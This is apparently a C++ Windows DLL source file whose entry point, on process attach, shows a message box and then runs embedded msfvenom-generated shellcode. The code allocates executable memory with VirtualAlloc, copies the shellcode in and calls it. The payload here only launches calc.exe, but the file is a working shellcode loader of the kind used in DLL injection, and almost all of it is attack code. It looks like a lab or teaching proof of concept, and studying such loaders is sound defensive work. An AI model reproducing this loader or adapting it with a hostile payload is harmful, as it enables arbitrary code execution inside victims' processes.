// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)

{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(0, (LPCWSTR)L"From DLL\n", (LPCWSTR)L"Process Attached", MB_ICONINFORMATION);
        // msfvenom - a x86 - platform windows - p windows / exec cmd = calc.exe - b "\00\x0a\x0d" - f c
        char shellcode[] =
            "\xd9\xe8\xd9\x74\x24\xf4\x5e\xb8\xc1\x92\xc6\x0f\x29\xc9\xb1"
            "\x31\x31\x46\x18\x03\x46\x18\x83\xc6\xc5\x70\x33\xf3\x2d\xf6"
            "\xbc\x0c\xad\x97\x35\xe9\x9c\x97\x22\x79\x8e\x27\x20\x2f\x22"
            "\xc3\x64\xc4\xb1\xa1\xa0\xeb\x72\x0f\x97\xc2\x83\x3c\xeb\x45"
            "\x07\x3f\x38\xa6\x36\xf0\x4d\xa7\x7f\xed\xbc\xf5\x28\x79\x12"
            "\xea\x5d\x37\xaf\x81\x2d\xd9\xb7\x76\xe5\xd8\x96\x28\x7e\x83"
            "\x38\xca\x53\xbf\x70\xd4\xb0\xfa\xcb\x6f\x02\x70\xca\xb9\x5b"
            "\x79\x61\x84\x54\x88\x7b\xc0\x52\x73\x0e\x38\xa1\x0e\x09\xff"
            "\xd8\xd4\x9c\xe4\x7a\x9e\x07\xc1\x7b\x73\xd1\x82\x77\x38\x95"
            "\xcd\x9b\xbf\x7a\x66\xa7\x34\x7d\xa9\x2e\x0e\x5a\x6d\x6b\xd4"
            "\xc3\x34\xd1\xbb\xfc\x27\xba\x64\x59\x23\x56\x70\xd0\x6e\x3c"
            "\x87\x66\x15\x72\x87\x78\x16\x22\xe0\x49\x9d\xad\x77\x56\x74"
            "\x8a\x88\x1c\xd5\xba\x00\xf9\x8f\xff\x4c\xfa\x65\xc3\x68\x79"
            "\x8c\xbb\x8e\x61\xe5\xbe\xcb\x25\x15\xb2\x44\xc0\x19\x61\x64"
            "\xc1\x79\xe4\xf6\x89\x53\x83\x7e\x2b\xac";

        // allocate memory for shellcode
        void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        // copy shellcode to allocated space
        memcpy(exec, shellcode, sizeof shellcode);
        // execute shellcode with c++ magic
        ((void(*)())exec)();

        break;
    }
    return TRUE;
}


